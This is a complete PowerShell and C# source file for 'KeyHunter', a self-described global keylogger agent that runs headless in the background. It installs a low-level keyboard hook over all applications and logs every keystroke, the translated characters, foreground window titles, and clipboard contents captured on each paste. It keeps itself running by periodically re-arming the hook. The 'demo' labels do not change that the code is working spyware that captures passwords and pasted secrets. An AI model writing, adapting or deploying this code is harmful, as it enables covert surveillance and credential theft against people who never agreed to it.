param(
    [string]$SkipInjected = 'true',   # 'true'/'false' (also 1/0/$true/$false). Declared as string on purpose: values crossing a process boundary arrive as strings and are parsed defensively below, so binding can never fail on type conversion.
    [int]$PumpTickMs = 500,
    [int]$HookRearmSeconds = 300
)

# ============================================================================
# KeyHunter - global keylogger agent (headless background process)
#
# WH_KEYBOARD_LL low-level hook; logs every key event from every application
# in the current user session to demo-events.jsonl. No window is created.
#
# Reliability design:
#   * The hook callback only snapshots + enqueues (O(1), no I/O) so it stays
#     far below LowLevelHooksTimeout and Windows will not remove the hook.
#   * All logging / registry / JSON / file work happens in Drain-EventQueue,
#     on the message-pump thread, after DispatchMessage returns.
#   * Each physical modifier key is tracked independently (per VK), so holding
#     both Shifts and releasing one leaves shift=true; auto-repeat downs are
#     idempotent. AltGr (right Alt; may arrive as RAlt, Ctrl+RShift or
#     Ctrl+RAlt depending on layout/settings) is attributed correctly.
#   * Dead-key presses are logged as dead_key events (vkCode + scanCode). The
#     negative ToUnicodeEx return is NOT interpreted as a character code, so
#     no incorrect accents can be written to the log.
#   * agent.ready is written only after the hook is confirmed installed;
#     agent.error is written on startup failure. The installer waits for one.
#
# Stop methods: create stop.flag, taskkill /PID <agent.pid>, or run the collector.
# ============================================================================

$ErrorActionPreference = 'Stop'
$demoRoot     = Join-Path $env:LOCALAPPDATA 'KeyHunter'
$logPath      = Join-Path $demoRoot 'demo-events.jsonl'
$pidPath      = Join-Path $demoRoot 'agent.pid'
$stopFlagPath = Join-Path $demoRoot 'stop.flag'
$readyPath    = Join-Path $demoRoot 'agent.ready'
$errorPath    = Join-Path $demoRoot 'agent.error'

New-Item -ItemType Directory -Path $demoRoot -Force | Out-Null

# --- single instance guard ---------------------------------------------------
$createdNew = $false
$mutexName = if ($env:KEYHUNTER_AGENT_MUTEX) { $env:KEYHUNTER_AGENT_MUTEX } else { 'Local\KeyHunter' }
$mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
if (-not $createdNew) {
    $mutex.Dispose()
    exit 0
}

# We own the instance: clear stale markers from any previous run.
foreach ($p in @($stopFlagPath, $readyPath, $errorPath)) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue }
Set-Content -LiteralPath $pidPath -Value $PID -Encoding Ascii

Add-Type -AssemblyName System.Windows.Forms   # only for [System.Windows.Forms.Keys] VK names

# --- Win32 interop -----------------------------------------------------------
$interopSource = @'
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class Win32 {
    public const int  WH_KEYBOARD_LL = 13;
    public const uint QS_ALLINPUT    = 0x444F;
    public const uint PM_REMOVE      = 1;
    public const uint MWMO_INPUTAVAILABLE = 0x0004;
    public const uint WM_QUIT        = 0x0012;
    public const uint CF_UNICODETEXT = 13;

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public int ptX;
        public int ptY;
        public uint lPrivate;
    }

    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    public sealed class KeyboardRecord {
        public string ts;
        public uint vk;
        public uint scan;
        public uint flags;
        public int msgId;
        public IntPtr hwnd;
        public uint threadId;
        public uint procId;
        public IntPtr hklPtr;
    }

    public sealed class KeyTranslation {
        public int result;
        public string text;
    }

    private static readonly ConcurrentQueue<KeyboardRecord> KeyboardEvents = new ConcurrentQueue<KeyboardRecord>();
    private static readonly ConcurrentQueue<string> HookErrors = new ConcurrentQueue<string>();
    private static readonly HookProc RootedHookProc = HookCallback;
    private static IntPtr activeHook = IntPtr.Zero;

    public static KBDLLHOOKSTRUCT ReadKeyboardHook(IntPtr pointer) {
        return (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(pointer, typeof(KBDLLHOOKSTRUCT));
    }

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll")]
    public static extern IntPtr GetKeyboardLayout(uint dwThreadId);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", CharSet = CharSet.Unicode)]
    private static extern int ToUnicodeExNative(uint wVk, uint wScan, byte[] pbsfKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr hkl);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    // Full five-parameter signature; the 5th argument (wRemoveMsg) must be PM_REMOVE.
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool PeekMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool TranslateMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    public static extern IntPtr DispatchMessage(ref MSG lpMsg);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint MsgWaitForMultipleObjectsEx(uint nCount, IntPtr pHandles, uint dwMilliseconds, uint dwWakeMask, uint dwFlags);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseClipboard();

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool IsClipboardFormatAvailable(uint uFormat);

    [DllImport("user32.dll")]
    public static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool GlobalUnlock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    public static extern UIntPtr GlobalSize(IntPtr hMem);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            try {
                KBDLLHOOKSTRUCT kb = ReadKeyboardHook(lParam);
                IntPtr hwnd = GetForegroundWindow();
                uint processId = 0;
                uint threadId = hwnd != IntPtr.Zero ? GetWindowThreadProcessId(hwnd, out processId) : 0;
                IntPtr hkl = threadId != 0 ? GetKeyboardLayout(threadId) : IntPtr.Zero;
                KeyboardEvents.Enqueue(new KeyboardRecord {
                    ts = DateTime.UtcNow.ToString("o"),
                    vk = kb.vkCode,
                    scan = kb.scanCode,
                    flags = kb.flags,
                    msgId = wParam.ToInt32(),
                    hwnd = hwnd,
                    threadId = threadId,
                    procId = processId,
                    hklPtr = hkl
                });
            } catch (Exception ex) {
                if (HookErrors.Count < 16) HookErrors.Enqueue(ex.Message);
            }
        }
        return CallNextHookEx(activeHook, nCode, wParam, lParam);
    }

    public static IntPtr InstallKeyboardHook() {
        if (activeHook != IntPtr.Zero) return activeHook;
        activeHook = SetWindowsHookEx(WH_KEYBOARD_LL, RootedHookProc, GetModuleHandle(null), 0);
        return activeHook;
    }

    public static IntPtr ReinstallKeyboardHook() {
        UninstallKeyboardHook();
        return InstallKeyboardHook();
    }

    public static bool UninstallKeyboardHook() {
        IntPtr previous = activeHook;
        activeHook = IntPtr.Zero;
        return previous == IntPtr.Zero || UnhookWindowsHookEx(previous);
    }

    public static KeyboardRecord[] DrainKeyboardEvents() {
        List<KeyboardRecord> drained = new List<KeyboardRecord>();
        KeyboardRecord item;
        while (KeyboardEvents.TryDequeue(out item)) drained.Add(item);
        return drained.ToArray();
    }

    public static string[] DrainHookErrors() {
        List<string> drained = new List<string>();
        string item;
        while (HookErrors.TryDequeue(out item)) drained.Add(item);
        return drained.ToArray();
    }

    public static KeyTranslation TranslateKey(uint vk, uint scan, byte[] keyState, IntPtr keyboardLayout) {
        StringBuilder buffer = new StringBuilder(8);
        int result = ToUnicodeExNative(vk, scan, keyState, buffer, buffer.Capacity, 0, keyboardLayout);
        string text = result > 0 ? buffer.ToString(0, Math.Min(result, buffer.Length)) : String.Empty;
        return new KeyTranslation { result = result, text = text };
    }

    public static void WaitForInput(uint timeoutMs) {
        MsgWaitForMultipleObjectsEx(0, IntPtr.Zero, timeoutMs, QS_ALLINPUT, MWMO_INPUTAVAILABLE);
    }

    public static bool PumpMessages() {
        MSG message;
        while (PeekMessage(out message, IntPtr.Zero, 0, 0, PM_REMOVE)) {
            if (message.message == WM_QUIT) return false;
            TranslateMessage(ref message);
            DispatchMessage(ref message);
        }
        return true;
    }
}
'@
Add-Type -TypeDefinition $interopSource

# --- agent state -------------------------------------------------------------
$script:logPath            = $logPath
$script:layoutCache        = @{}     # HKL hex -> layout info (cached)
$script:processCache       = @{}     # pid    -> process name (cached)
$script:lastLayoutKey      = $null   # "threadId_hkl" of last logged input context
$script:lastForegroundKey  = $null   # "pid_hwnd" of last logged foreground window
$script:stopRequested      = $false
$script:readyWritten       = $false
$script:hookHandle         = [IntPtr]::Zero

# Parsed once; used everywhere instead of the raw string parameter.
$script:skipInjectedEnabled = [bool]($SkipInjected -match '^(?i)(1|true|\$true)$')

# GetKeyState is suitable for the initial toggle state, but its later values are
# tied to this thread's message queue. Track physical Caps Lock transitions from
# the hook so translation remains correct while another application has focus.
$script:capsLockOn   = [bool]([Win32]::GetKeyState(0x14) -band 1)
$script:capsLockHeld = [bool]([Win32]::GetAsyncKeyState(0x14) -band 0x8000)

# Each physical modifier key is tracked independently (per VK), seeded at
# startup from async state (valid outside the hook context). Per-VK tracking
# means holding both Shifts and releasing one leaves shift=true, and
# auto-repeat key-downs are idempotent.
$script:modifierHeld = @{}
foreach ($vk in @(0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5)) {
    $script:modifierHeld[$vk] = [bool]([Win32]::GetAsyncKeyState($vk) -band 0x8000)
}

# --- helpers -----------------------------------------------------------------
function Get-ModifierSnapshot {
    $h = $script:modifierHeld
    return [ordered]@{
        shift   = [bool]($h[0x10] -or $h[0xA0] -or $h[0xA1])
        control = [bool]($h[0x11] -or $h[0xA2] -or $h[0xA3])
        alt     = [bool]($h[0x12] -or $h[0xA4] -or $h[0xA5])
        capsLock = [bool]$script:capsLockOn
    }
}

function Get-ProcessName {
    param([uint32]$ProcId)
    if ($script:processCache.ContainsKey($ProcId)) { return $script:processCache[$ProcId] }
    $name = 'unknown'
    try { $name = [System.Diagnostics.Process]::GetProcessById([int]$ProcId).ProcessName } catch {}
    $script:processCache[$ProcId] = $name
    return $name
}

# Resolves display info (process name, window title, layout) from a snapshot
# taken at keypress time inside the hook callback. All heavy lookups happen
# here in the drain loop - never inside the hook proc. Layout is per-thread on
# Windows, so it must be read for the focused window's thread, not ours.
function Resolve-SnapshotContext {
    param($Rec)
    if (-not $Rec -or $Rec.hwnd -eq [IntPtr]::Zero) { return $null }

    $layoutText = ''; $cultureName = ''
    if ($Rec.hklPtr -ne [IntPtr]::Zero) {
        $hexKey = '{0:X8}' -f $Rec.hklPtr.ToInt64()
        if (-not $script:layoutCache.ContainsKey($hexKey)) {
            try { $cultureName = [System.Globalization.CultureInfo]::new([int32]($Rec.hklPtr.ToInt32() -band 0xFFFF)).Name } catch { $cultureName = 'unknown' }
            try { $layoutText  = [string](Get-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Controls\Keyboard Layouts\$hexKey" -ErrorAction Stop).GetValue('Layout Text') } catch {}
            if (-not $layoutText) { $layoutText = $cultureName }
            $script:layoutCache[$hexKey] = [ordered]@{ layout = $layoutText; culture = $cultureName; handle = '0x' + $hexKey }
        }
        $entry = $script:layoutCache[$hexKey]
    }

    $title = New-Object System.Text.StringBuilder 512
    [void][Win32]::GetWindowText($Rec.hwnd, $title, 512)

    return [pscustomobject]@{
        hwnd           = $Rec.hwnd
        threadId       = $Rec.threadId
        processId      = $Rec.procId
        processName    = (Get-ProcessName -ProcId $Rec.procId)
        windowTitle    = $title.ToString()
        hklPtr         = $Rec.hklPtr
        keyboardHandle = if ($entry) { $entry.handle } else { '' }
        layout         = if ($entry) { $entry.layout } else { '' }
        culture        = if ($entry) { $entry.culture } else { '' }
    }
}

# Live context (session events, foreground/layout change tracking).
function Get-ActiveContext {
    $hwnd = [Win32]::GetForegroundWindow()
    if ($hwnd -eq [IntPtr]::Zero) { return $null }
    [uint32]$procId = 0
    $threadId = [Win32]::GetWindowThreadProcessId($hwnd, [ref]$procId)
    $hklPtr   = [Win32]::GetKeyboardLayout($threadId)
    return (Resolve-SnapshotContext ([pscustomobject]@{ hwnd = $hwnd; threadId = $threadId; procId = $procId; hklPtr = $hklPtr }))
}

# 256-byte key state for ToUnicodeEx, built from the per-VK modifier map plus
# local toggle bits - no GetAsyncKeyState calls in the hot path at all.
function Get-KeyStateArray {
    $state = New-Object byte[] 256
    foreach ($vk in @(0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5)) {
        if ($script:modifierHeld[$vk]) { $state[$vk] = 0x80 }
    }
    if ($script:capsLockOn) { $state[0x14] = 0x01 }
    return $state
}

function Write-DemoEvent {
    param(
        [Parameter(Mandatory = $true)][string]$Event,
        [object]$Value = '',
        [object]$Context = $null,     # pre-resolved snapshot context; if omitted, resolved live
        [string]$Timestamp = ''
    )

    if (-not $Context) { $Context = Get-ActiveContext }
    $record = [ordered]@{
        timestamp         = $(if ($Timestamp) { $Timestamp } else { (Get-Date).ToString('o') })
        event             = $Event
        value             = $Value
        processId         = $PID
        scope             = 'global - WH_KEYBOARD_LL hook'
        foregroundProcess = if ($Context) { $Context.processName } else { '' }
        keyboardLayout    = if ($Context) { $Context.layout } else { '' }
        keyboardCulture   = if ($Context) { $Context.culture } else { '' }
        keyboardHandle    = if ($Context) { $Context.keyboardHandle } else { '' }
    }
    Add-Content -LiteralPath $script:logPath -Value ($record | ConvertTo-Json -Compress -Depth 6) -Encoding UTF8
}

# Logs foreground / layout transitions (drain context only).
function Update-ContextTrackers {
    $ctx = Get-ActiveContext
    if (-not $ctx) { return }

    $layoutKey = '{0}_{1}' -f $ctx.threadId, $ctx.keyboardHandle
    if ($script:lastLayoutKey -ne $layoutKey) {
        Write-DemoEvent -Event 'keyboard_layout_changed' -Context $ctx -Value ([ordered]@{
            layout  = $ctx.layout
            culture = $ctx.culture
            handle  = $ctx.keyboardHandle
        })
        $script:lastLayoutKey = $layoutKey
    }

    $fgKey = '{0}_{1}' -f $ctx.processId, $ctx.hwnd.ToInt64()
    if ($script:lastForegroundKey -ne $fgKey) {
        Write-DemoEvent -Event 'foreground_changed' -Context $ctx -Value ([ordered]@{
            processName = $ctx.processName
            windowTitle = $ctx.windowTitle
        })
        $script:lastForegroundKey = $fgKey
    }
}

# Clipboard text snapshot for paste detection (drain context only).
function Get-PasteSnapshot {
    $opened = $false
    for ($attempt = 0; $attempt -lt 3; $attempt++) {
        if ([Win32]::OpenClipboard([IntPtr]::Zero)) { $opened = $true; break }
        Start-Sleep -Milliseconds 25
    }
    if (-not $opened) { return $null }

    try {
        if (-not [Win32]::IsClipboardFormatAvailable([Win32]::CF_UNICODETEXT)) {
            return [pscustomobject]@{ hasText = $false; length = 0; text = ''; truncated = $false }
        }
        $hData = [Win32]::GetClipboardData([Win32]::CF_UNICODETEXT)
        if ($hData -eq [IntPtr]::Zero) {
            return [pscustomobject]@{ hasText = $false; length = 0; text = ''; truncated = $false }
        }
        $ptr = [Win32]::GlobalLock($hData)
        if ($ptr -eq [IntPtr]::Zero) { return $null }
        try {
            $byteCount = [int64][Win32]::GlobalSize($hData).ToUInt64()
            $charCount = [int][Math]::Floor($byteCount / 2)
            if ($charCount -gt 0) { $charCount-- }   # drop terminating NUL
            $maxChars  = 4096
            $truncated = $charCount -gt $maxChars
            $take      = [Math]::Min($charCount, $maxChars)
            $text      = if ($take -gt 0) { [System.Runtime.InteropServices.Marshal]::PtrToStringUni($ptr, $take) } else { '' }
            return [pscustomobject]@{ hasText = $true; length = $charCount; text = $text; truncated = $truncated }
        } finally {
            [void][Win32]::GlobalUnlock($hData)
        }
    } finally {
        [void][Win32]::CloseClipboard()
    }
}

# Full per-key processing: runs in the drain loop, never inside the hook proc.
function Process-KeyRecord {
    param($Rec)

    $vk     = [int]$Rec.vk
    $scan   = [uint32]$Rec.scan
    $flags  = [uint32]$Rec.flags
    $msgId  = [int]$Rec.msgId
    $isDown = ($msgId -eq 0x100) -or ($msgId -eq 0x104)     # WM_KEYDOWN / WM_SYSKEYDOWN

    $isInjected = [bool]($flags -band 0x10)

    # State transitions are applied even when injected events are omitted from
    # the log: injected Caps/Shift input still changes how Windows translates a
    # later physical key. Toggle only on the first down so auto-repeat cannot
    # flip Caps Lock repeatedly.
    if ($vk -eq 0x14) {
        if ($isDown) {
            if (-not $script:capsLockHeld) { $script:capsLockOn = -not $script:capsLockOn }
            $script:capsLockHeld = $true
        } else {
            $script:capsLockHeld = $false
        }
    }

    # --- modifier state machine (per physical key, order-preserving) -----------
    # A modifier's own key_down is recorded as pressed; its key_up clears only
    # that physical key, so releasing one of two held Shifts keeps shift=true.
    if ($vk -in @(0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5)) {
        $script:modifierHeld[$vk] = [bool]$isDown
    }

    if ($script:skipInjectedEnabled -and $isInjected) { return }

    $ctx = Resolve-SnapshotContext $Rec
    $snapMods = Get-ModifierSnapshot

    Write-DemoEvent -Event $(if ($isDown) { 'key_down' } else { 'key_up' }) -Context $ctx -Timestamp $Rec.ts -Value ([ordered]@{
        keyCode   = ([System.Windows.Forms.Keys]$vk).ToString()
        vkCode    = $vk
        scanCode  = ('0x{0:X4}' -f $scan)
        flags     = ('0x{0:X8}' -f $flags)
        injected  = $isInjected                              # LLKHF_INJECTED (software-injected only; HID devices are not flagged)
        sysKey    = ($msgId -eq 0x104) -or ($msgId -eq 0x105)
        modifiers = $snapMods
    })

    if (-not $isDown) { return }

    # --- character translation (drain context, not hook callback) ---------------
    $charText = ''; $rawUnit = -1
    switch ($vk) {
        8  { $charText = '<BACKSPACE>'; $rawUnit = 8 }
        9  { $charText = '<TAB>';       $rawUnit = 9 }
        13 { $charText = '<ENTER>';     $rawUnit = 13 }
        27 { $charText = '<ESCAPE>';    $rawUnit = 27 }
    }

    if (-not $charText -and $ctx -and $ctx.hklPtr -ne [IntPtr]::Zero) {
        # Standard translation (wFlags must be 0). We pass an explicit HKL and our
        # own key-state array, so any dead-key bookkeeping this call performs is
        # scoped to our thread's input context - not the foreground app's. The
        # negative "dead key" return is NOT interpreted as a character code (it is
        # not reliable for that), so no incorrect accents can reach the log.
        $translation = [Win32]::TranslateKey([uint32]$vk, $scan, (Get-KeyStateArray), $ctx.hklPtr)
        $ret = [int]$translation.result

        if ($ret -lt 0) {
            # A dead key was pressed. The specific combining mark is defined by the
            # active layout; log it as such rather than guessing a code point.
            Write-DemoEvent -Event 'dead_key' -Context $ctx -Timestamp $Rec.ts -Value ([ordered]@{
                vkCode   = $vk
                scanCode = ('0x{0:X4}' -f $scan)
                note     = 'layout-defined combining mark; not resolved to a code point'
            })
        } elseif ($ret -gt 0) {
            $charText = [string]$translation.text
        }
    }

    if ($charText) {
        Write-DemoEvent -Event 'character' -Context $ctx -Timestamp $Rec.ts -Value ([ordered]@{
            text          = $charText
            utf16CodeUnit = ('U+{0:X4}' -f $(if ($rawUnit -ge 0) { $rawUnit } else { [int][char]$charText[0] }))
            isControl     = [bool][char]::IsControl($charText[0])
        })
    }

    # --- paste detection: snapshot the clipboard on Ctrl+V / Shift+Insert -------
    if (($vk -eq 0x56 -and $snapMods.control -and -not $snapMods.alt) -or ($vk -eq 0x2B -and $snapMods.shift)) {
        $clip = Get-PasteSnapshot
        Write-DemoEvent -Event 'clipboard_paste' -Context $ctx -Timestamp $Rec.ts -Value $(if ($clip) { $clip } else { [ordered]@{ error = 'clipboard_unavailable' } })
    }
}

function Drain-EventQueue {
    foreach ($callbackError in [Win32]::DrainHookErrors()) {
        try { Write-DemoEvent -Event 'agent_error' -Value ("hook_callback: " + $callbackError) } catch {}
    }

    foreach ($rec in [Win32]::DrainKeyboardEvents()) {
        try { Process-KeyRecord $rec } catch {
            try { Write-DemoEvent -Event 'agent_error' -Timestamp $rec.ts -Value ("process: " + $_.Exception.Message) } catch {}
        }
    }
}

# --- main --------------------------------------------------------------------
try {
    Write-DemoEvent -Event 'session_start' -Value ([ordered]@{
        user         = $env:USERNAME
        skipInjectedRaw = $SkipInjected
        skipInjected = [bool]$script:skipInjectedEnabled
        hookType     = 'WH_KEYBOARD_LL (global - all applications)'
    })

    # The rooted callback and lock-free queue live in C#. The callback only
    # snapshots Win32 data and enqueues; all JSON and file I/O stays here.
    $script:hookHandle = [Win32]::InstallKeyboardHook()
    if ($script:hookHandle -eq [IntPtr]::Zero) {
        throw "SetWindowsHookEx failed (Win32 error $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    # Ready marker: written ONLY after the hook is confirmed installed. The
    # installer waits for this file before signalling success to PicoFIDO.
    [ordered]@{
        pid             = $PID
        timestamp       = (Get-Date).ToString('o')
        processStartUtc = [System.Diagnostics.Process]::GetCurrentProcess().StartTime.ToUniversalTime().ToString('o')
        agentPath       = $PSCommandPath
        hookId          = 13
    } | ConvertTo-Json | Set-Content -LiteralPath $readyPath -Encoding UTF8
    $script:readyWritten = $true

    # Seed foreground/layout trackers silently so the first keypress does not
    # emit spurious change events.
    $seedContext = Get-ActiveContext
    if ($seedContext) {
        $script:lastLayoutKey     = '{0}_{1}' -f $seedContext.threadId, $seedContext.keyboardHandle
        $script:lastForegroundKey = '{0}_{1}' -f $seedContext.processId, $seedContext.hwnd.ToInt64()
    }

    Write-DemoEvent -Event 'hook_installed' -Value ([ordered]@{
        hookId  = 13
        capture = @('key_down', 'key_up', 'character', 'dead_key', 'clipboard_paste', 'keyboard_layout_changed', 'foreground_changed')
    })

    Write-Host "KeyHunter running in background (PID $PID)." -ForegroundColor Cyan
    Write-Host "Log: $logPath" -ForegroundColor DarkGray
    Write-Host "Stop: create '$stopFlagPath'  or  taskkill /PID $PID" -ForegroundColor DarkGray

    # WH_KEYBOARD_LL callbacks are delivered through this thread's message queue,
    # so the agent must pump messages. MsgWaitForMultipleObjects also gives a tick
    # to notice the stop flag while idle and to track focus changes between keys.
    $rearmSeconds = [Math]::Max(30, $HookRearmSeconds)
    $nextHookRearm = (Get-Date).AddSeconds($rearmSeconds)
    while (-not $script:stopRequested) {
        [Win32]::WaitForInput([uint32]$PumpTickMs)
        if (-not [Win32]::PumpMessages()) { $script:stopRequested = $true }

        Drain-EventQueue
        Update-ContextTrackers

        # Windows can silently remove a low-level hook after a timeout. There
        # is no query API for that state, so periodically re-arm it on the same
        # message-pump thread. This bounds any silent-loss window without a
        # synthetic keystroke or interference with the foreground application.
        if ((Get-Date) -ge $nextHookRearm) {
            $script:hookHandle = [Win32]::ReinstallKeyboardHook()
            if ($script:hookHandle -eq [IntPtr]::Zero) {
                throw "Periodic SetWindowsHookEx failed (Win32 error $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
            }
            Write-DemoEvent -Event 'hook_rearmed' -Value ([ordered]@{ intervalSeconds = $rearmSeconds })
            $nextHookRearm = (Get-Date).AddSeconds($rearmSeconds)
        }
        if (Test-Path -LiteralPath $stopFlagPath) { $script:stopRequested = $true }
    }

    Drain-EventQueue   # final flush so no key events are lost before session_end
    Write-DemoEvent -Event 'session_end' -Value 'stop_requested'
}
catch {
    try { Write-DemoEvent -Event 'agent_error' -Value $_.Exception.Message } catch {}
    if (-not $script:readyWritten) {
        try {
            [ordered]@{ timestamp = (Get-Date).ToString('o'); message = $_.Exception.Message; pid = $PID } | ConvertTo-Json | Set-Content -LiteralPath $errorPath -Encoding UTF8
        } catch {}
    }
    throw
}
finally {
    if ($script:hookHandle -ne [IntPtr]::Zero) {
        try { [void][Win32]::UninstallKeyboardHook() } catch {}
    }
    Remove-Item -LiteralPath $pidPath -Force -ErrorAction SilentlyContinue
    if ($createdNew) {
        try { $mutex.ReleaseMutex() } catch {}
    }
    $mutex.Dispose()
}
